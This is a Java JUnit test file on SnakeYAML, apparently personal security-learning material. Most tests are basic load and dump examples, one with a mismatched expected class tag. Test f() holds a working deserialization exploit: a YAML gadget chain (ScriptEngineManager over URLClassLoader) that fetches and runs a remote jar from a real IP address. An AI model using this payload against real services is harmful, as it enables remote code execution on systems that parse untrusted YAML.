package com.xjjlearning.hack.java;

import jdk.nashorn.internal.objects.annotations.Getter;
import jdk.nashorn.internal.objects.annotations.Setter;
import org.junit.Test;
import org.yaml.snakeyaml.Yaml;

import javax.script.ScriptEngineManager;
import java.io.StringWriter;
import java.net.URLClassLoader;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.junit.Assert.assertEquals;

/**
 * Created by xjj on 2023/5/4.
 */
public class SnakeYamlTest {
    @Test
    public void basic() {
        String yamlStr = "key: hello yaml";
        Yaml yaml = new Yaml();
        Object ret = yaml.load(yamlStr);
        System.out.println(ret);
    }

    @Test
    public void serialize() {
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("name", "Silenthand Olleander");
        data.put("race", "Human");
        data.put("traits", new String[]{"ONE_HAND", "ONE_EYE"});
        Yaml yaml = new Yaml();
        StringWriter writer = new StringWriter();
        yaml.dump(data, writer);
        String expectedYaml = "name: Silenthand Olleander\nrace: Human\ntraits: [ONE_HAND, ONE_EYE]\n";

        assertEquals(expectedYaml, writer.toString());
    }

    @Test
    public void serializeObject() {
        Customer customer = new Customer();
        customer.setAge(45);
        customer.setFirstName("Greg");
        customer.setLastName("McDowell");
        Yaml yaml = new Yaml();
        StringWriter writer = new StringWriter();
        yaml.dump(customer, writer);
        String expectedYaml = "!!com.baeldung.snakeyaml.Customer {age: 45, contactDetails: null, firstName: Greg,\n  homeAddress: null, lastName: McDowell}\n";
        assertEquals(expectedYaml, writer.toString());
    }

    @Test
    public void f() {
//        https://xz.aliyun.com/t/11599
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://47.95.7.37:9870/tomcat/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        new Yaml().load(yaml);
//        ScriptEngineManager
//        URLClassLoader
    }

    public class Customer {
        private String firstName;
        private String lastName;

        public String getFirstName() {
            return firstName;
        }

        public void setFirstName(String firstName) {
            this.firstName = firstName;
        }

        public String getLastName() {
            return lastName;
        }

        public void setLastName(String lastName) {
            this.lastName = lastName;
        }

        public int getAge() {
            return age;
        }

        public void setAge(int age) {
            this.age = age;
        }

        public List<Contact> getContactDetails() {
            return contactDetails;
        }

        public void setContactDetails(List<Contact> contactDetails) {
            this.contactDetails = contactDetails;
        }

        public Address getHomeAddress() {
            return homeAddress;
        }

        public void setHomeAddress(Address homeAddress) {
            this.homeAddress = homeAddress;
        }

        private int age;
        private List<Contact> contactDetails;
        private Address homeAddress;
        // getters and setters
    }
    public class Contact {
        private String type;
        private int number;
        // getters and setters
    }

    public class Address {
        private String line;
        private String city;
        private String state;
        private Integer zip;
        // getters and setters
    }

}
